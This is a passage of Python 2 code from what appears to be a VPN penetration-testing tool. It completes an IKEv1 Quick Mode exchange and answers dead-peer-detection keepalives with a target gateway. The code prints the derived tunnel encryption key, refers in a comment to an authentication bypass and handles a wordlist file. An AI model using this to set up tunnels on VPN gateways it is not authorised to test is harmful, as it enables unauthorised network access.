			#Transform set
			if debug > 0:
		                print "\n--------------------Sending sixth packet - Quick Mode 1--------------------"
	                xType = "20" #Quick Mode
			phase = 2

			transID = "0c" #3 - ENCR_3DES, 12 (0c) - aes-cbc

			#Transform payload
			arrayTrans = ikeneg.ikeTransform(encType,"01",authType,DHGroup,"01","00007080",transID,phase,"00")
			bytesTrans = ikeneg.packPacket(arrayTrans)
			#Proposal Payload
			arrayProposal = ikeneg.ikeProposal(bytesTrans.encode('hex'), "02", phase)
			bytesProposal = ikeneg.packPacket(arrayProposal)
			#SA Payload
			arraySA = ikeneg.ikeSA(bytesProposal.encode('hex'))
			bytesSA = ikeneg.packPacket(arraySA)
			
			#arraySA_i = arraySA[4:]
			#SA_i = self.packPacket(arraySA_i).encode('hex')

			#SA_i = arraySA[2:]
			SA_i = bytesSA.encode('hex')[8:]
			bytesSA_i = SA_i.decode('hex')

			arrayNonce,nonce = ikeneg.ikeNonce("0d")
			bytesNonce = ikeneg.packPacket(arrayNonce)

			#Pull IP from previous Mode CFG transaction
			mcfgIP = dicCrypto["MCFG_IPi"].decode('hex')
			#mcfgIP = "c0a801eb".decode('hex')

			###***TRY ADDING XAUTH PAYLAOD HERE FOR AUTH BYPASS FAILURE FIX
        		#ID payload
        		arrayID,ID_i = ikeneg.ikeID(mcfgIP.encode('hex'),"01","0000","00","05")#next payload = ID (5), 0000 = port
			bytesID = ikeneg.packPacket(arrayID)

			#***NOTE - LOOK AT PADDING PRIOR TO ADDING HASH PAYLOAD AND AFTER
                        #ID payload
                        arrayID1,ID_i1 = ikeneg.ikeID("0000000000000000","04","0000","00","00")#next payload = none (0), 04 = idtype, 0000 = port # next payload = 0d - vid
			bytesID1 = ikeneg.packPacket(arrayID1)

		        #VID payload
        		arrayVID = ikeneg.ikeVID("05","09002689dfd6b712")
			bytesVID = ikeneg.packPacket(arrayVID)

			qmData = bytesSA_i+bytesNonce+bytesVID+bytesID+bytesID1
			
			qmData = "0a00020400000001000000010200002c000304010b36f8fb00000020000c000080060100800400018005000280010001000200040020c49b0200002c010304010b36f8fb00000020000c000080060100800400018005000180010001000200040020c49b0200002c020304010b36f8fb00000020000c0000800600c0800400018005000280010001000200040020c49b0200002c030304010b36f8fb00000020000c0000800600c0800400018005000180010001000200040020c49b0200002c040304010b36f8fb00000020000c000080060080800400018005000280010001000200040020c49b0200002c050304010b36f8fb00000020000c000080060080800400018005000180010001000200040020c49b02000028060304010b36f8fb0000001c00030000800400018005000280010001000200040020c49b02000028070304010b36f8fb0000001c00030000800400018005000180010001000200040020c49b02000028080304010b36f8fb0000001c00020000800400018005000280010001000200040020c49b02000028090304010b36f8fb0000001c00020000800400018005000180010001000200040020c49b020000280a0304010b36f8fb0000001c000b0000800400018005000280010001000200040020c49b000000280b0304010b36f8fb0000001c000b0000800400018005000180010001000200040020c49b050000185b3693728fb19dab4d3cb0fa90e64f9e1f57753e0500000c01000000c0a801fb00000010040000000000000000000000".decode('hex')# 00000000"
			nonce = "5b3693728fb19dab4d3cb0fa90e64f9e1f57753e"
			arrayqmData = array.array('B', qmData)
			bytesqmData = ikeneg.packPacket(arrayqmData)
			#plainPayload = ikeCrypto.calcPadding(encType, qmData)

                        hash_1 = ikeCrypto.calcHASHQM(skeyid_a, msgID.decode('hex'), qmData, hashType, 1)
                        arrayHash = ikeneg.ikeHash("01",hash_1)#next payload 01
			bytesHash = ikeneg.packPacket(arrayHash)

                        #Encrypt everything but the header
			curIV = ikeCrypto.calcIV(p2IV.decode('hex'), msgID.decode('hex'), IVlen, hashType)
                        plainPayload = ikeCrypto.calcPadding(encType,bytesHash+bytesqmData)
                        if debug > 0:
                                print "Plain-text Payload: %s"%plainPayload.encode('hex')
                        #Encryption/decryption uses last block from previous encrypted payload (CBC) except when a new message ID is created
                        cipher = ikeCrypto.ikeCipher(encKey, curIV, encType)
			encPayload = cipher.encrypt(plainPayload)

                        if debug > 0:
                                print "Encrypted Payload: %s"%encPayload.encode('hex')	
				
			payloads = arrayencPayload = array.array('B', encPayload)
			payloads = ikeneg.packPacket(arrayencPayload)
			arrayIKE = ikeneg.ikeHeader("08",iCookie,rCookie,version,flags,xType,msgID,payloads.encode('hex'))
			bytesIKE = ikeneg.packPacket(arrayIKE)

			#Send QM packet 1
        	        ikeneg.sendPacket(bytesIKE,targetIP,sport,port)
        	        dicCrypto["lastBlock"] = bytesIKE.encode('hex')[-IVlen:]
                        count = 0
			status = "p2_qm1"
                        while len(packets) < 5:
                                time.sleep(0.01)
                                count += 1
                                if count > 500:
                                        print "No further responses received.\nExiting...\n"
					exit()


                if len(packets) == 5:
                        #Process Header first
                        ikeHandling = ikehandler.IKEv1Handler(debug)
                        ikeHDR = ikeHandling.parseHeader(packets[-1])
			#dicCrypto["lastBlock"] = packets[-1][-IVlen:]
                        #Check the packet is for this session
                        if ikeHDR[1] == dicCrypto["iCookie"]:
                                pass
                        else:
                                print "Packet received does not match this session, this is probably from a previous incarnation.7"
                                del packets[-1]
                                print "Removing packet"
                                continue

                        try:
                                if ikeHDR[5] == dicCrypto["msgID"]:
                                        if debug > 0:
                                                print "Message ID has not changed"
                                        curIV = dicCrypto["lastBlock"].decode('hex')
                                        pass
                                else:
                                        if debug > 0:
                                                print "Message ID has changed, recalculating IV"
                                        msgID = ikeHDR[5]
                                        curIV = ikeCrypto.calcIV(dicCrypto["p2IV"].decode('hex'), msgID.decode('hex'), IVlen, hashType)
                                        pass
                        except:
                                print "Invalid Message ID, too many concurrent sessions running. Wait 30 second and try again.\nExiting"
                                time.sleep(2)
                                exit()


                        if ikeHDR[4] == 5:
                                print "Informational packet received. Enable full debugging for more info. Exiting..."
				try:
					respDict,vidHolder = ikeHandling.main(packets[-1],encType,hashType,encKey,initIV,curIV)
                                except:
					respDict,vidHolder  = ikeHandling.main(packets[-1],encType,hashType)
                                #time.sleep(2)
                                #exit()
                        if ikeHDR[4] == 6:
                                print "QUICK MODE FAILED! PACKET MALFORMED?"
                                exit()
                        else:
                                pass

                        #Process full packet
                        respDict,vidHolder = ikeHandling.main(packets[-1],encType,hashType,encKey,initIV,curIV)
                        #Update state/crypto dictionary
                        dicCrypto.update(respDict)
			dicCrypto["lastBlock"] = packets[-1][-IVlen:]

                        if debug > 0:
                                print "\n--------------------Sending Quick Mode Packet 3------------------"
			#Send QM 3 packet
			#For QM hash 3 data = Nonce_i | Nonce_r (from phase 2 negotiations - not phase 1 nonces)
			nonce_r = dicCrypto["nonce_r"]
			nonces = nonce+nonce_r
                        hash_3 = ikeCrypto.calcHASHQM(skeyid_a, msgID.decode('hex'), nonces.decode('hex'), hashType, 3)
                        arrayHash = ikeneg.ikeHash("00",hash_3)#next payload 00
			bytesHash = ikeneg.packPacket(arrayHash)
			
                        #Encrypt everything but the header
			curIV = dicCrypto["lastBlock"].decode('hex')
                        plainPayload = ikeCrypto.calcPadding(encType,bytesHash)
                        if debug > 0:
                                print "Plain-text Payload: %s"%plainPayload.encode('hex')
                        #Encryption/decryption uses last block from previous encrypted payload (CBC) except whne msgID has changed
                        cipher = ikeCrypto.ikeCipher(encKey, curIV, encType)
                        encPayload = cipher.encrypt(plainPayload)

                        if debug > 0:
                                print "Encrypted Payload: %s"%encPayload.encode('hex')

                        arrayencPayload = array.array('B', encPayload)
			bytesencPayload = ikeneg.packPacket(arrayencPayload)

                        arrayIKE = ikeneg.ikeHeader("08",iCookie,rCookie,version,flags,xType,msgID,bytesencPayload.encode('hex'))#next payload 0 = none
			bytesIKE = ikeneg.packPacket(arrayIKE)

                        #Send QM packet 3
                        ikeneg.sendPacket(bytesIKE,targetIP,sport,port)
                        dicCrypto["lastBlock"] = bytesIKE.encode('hex')[-IVlen:]
			prot = "03"
			print "Phase 2 Complete!"
			p2spi = dicCrypto["p2spi"]
			print "============================SA===================================="
			print "|SPI (Outbound): 0b36f8fb                                        |"#static currently
			print "|SPI (Inbound): %s                                         |"%p2spi
			print "|Encryption Type: %s                                      |"%dicCrypto["Encryption Type"]
			print "|Authentication Algorithm: %s                              |"%dicCrypto["Authentication Algorithm"]
			print "|SA Life Duration: %s                                      |"%dicCrypto["SA Life Duration"]
			print "|SA Life Type: %s                                                 |"%dicCrypto["SA Life Type"]

			p2key = ikeCrypto.calcKEYMAT(hashType, keyLen, skeyid_d, prot.decode('hex'), p2spi.decode('hex'), nonce.decode('hex'), nonce_r.decode('hex'))
                        
			print "|Encryption Key: %s|"%p2key.encode('hex')
                        print "|Initial IV: %s                                    |\n=================================================================="%dicCrypto["p2IV"]			


                        while len(packets) < 6:
                                time.sleep(0.01)
                                count += 1	
                                if count > 500000:
                                        print "No further responses received.\nExiting...\n"
					exit()


		elif len(packets) > 5:
			#keepalive (DPD) responses to keep tunnel up
                        #Process Header first
                        ikeHandling = ikehandler.IKEv1Handler(debug)
                        ikeHDR = ikeHandling.parseHeader(packets[-1])
                        #Check the packet is for this session
                        if ikeHDR[1] == dicCrypto["iCookie"]:
                                pass
                        else:
                                print "Packet received does not match this session, this is probably from a previous incarnation.7"
                                del packets[-1]
                                print "Removing packet"
                                continue

                        try:
                                if ikeHDR[5] == dicCrypto["msgID"]:
                                        if debug > 0:
                                                print "Message ID has not changed"
                                        curIV = dicCrypto["lastBlock"].decode('hex')
                                        pass
                                else:
                                        if debug > 0:
                                                print "Message ID has changed, recalculating IV"
                                        msgID = ikeHDR[5]
                                        curIV = ikeCrypto.calcIV(dicCrypto["p2IV"].decode('hex'), msgID.decode('hex'), IVlen, hashType)
                                        pass
                        except:
                                print "Invalid Message ID, too many concurrent sessions running. Wait 30 second and try again.\nExiting"
                                time.sleep(2)
                                exit()


                        if ikeHDR[4] == 5:
                                
				respDict,vidHolder = ikeHandling.main(packets[-1],encType,hashType,encKey,initIV,curIV)
				if int(dicCrypto["notmsgType"]) == 36136 or int(dicCrypto["notmsgType"]) == 24576:
					if debug > 0:
						print "DPD payload received, sending heartbeat response"

					print msgID
					ikeneg = ikeclient.IKEv1Client(debug)
					ikeCrypto = crypto.ikeCrypto()
					xType = "05"
					spi = dicCrypto["iCookie"]+dicCrypto["rCookie"]
					notData = dicCrypto["notData"]
					msgType = hex(36137)[2:]#R-U-THERE-ACK
					arrayDPD = ikeneg.ikeNot("08",msgType,spi,notData)
					bytesDPD = ikeneg.packPacket(arrayDPD)
					
					hash = ikeCrypto.calcHASHgen(skeyid, bytesDPD, hashType)
					arrayHash = ikeneg.ikeHash("0b", hash)
					bytesHash = ikeneg.packPacket(arrayHash)

                        		#Encrypt everything but the header
                        		curIV = dicCrypto["lastBlock"].decode('hex')  
                        		plainPayload = ikeCrypto.calcPadding(encType,bytesHash+bytesDPD)
                        		if debug > 0:
                        		        print "Plain-text Payload: %s"%plainPayload.encode('hex')
                        		#Encryption/decryption uses last block from previous encrypted payloa$
                        		cipher = ikeCrypto.ikeCipher(encKey, curIV, encType)
                        		encPayload = cipher.encrypt(plainPayload)

                        		if debug > 0:   
                        		        print "Encrypted Payload: %s"%encPayload.encode('hex')

                        		arrayencPayload = array.array('B', encPayload)
                        		bytesencPayload = ikeneg.packPacket(arrayencPayload)

 					arrayIKE = ikeneg.ikeHeader("0b",iCookie,rCookie,version,flags,xType,msgID,bytesencPayload.encode('hex'))
					bytesIKE = ikeneg.packPacket(arrayIKE)

                        		#Send DPD packet
                        		ikeneg.sendPacket(bytesIKE,targetIP,sport,port)
                        		time.sleep(1)

				else:
					print "Informational packet received. Enable full debugging for more info. Exiting..."
					respDict,vidHolder = ikeHandling.main(packets[-1],encType,hashType,encKey,initIV,curIV)
					exit()

                        if ikeHDR[4] == 6:
                                print "QUICK MODE FAILED! PACKET MALFORMED?"
                                exit()
                        else:
                                pass




	    else:
		print "Received unexpected packet.\nExiting"
		time.sleep(2)
		exit()


    except  (KeyboardInterrupt, SystemExit):
	try:
		wordsfile.close()
	except:
		pass
	print "Shutting down server\n\n"
	t.join(6)

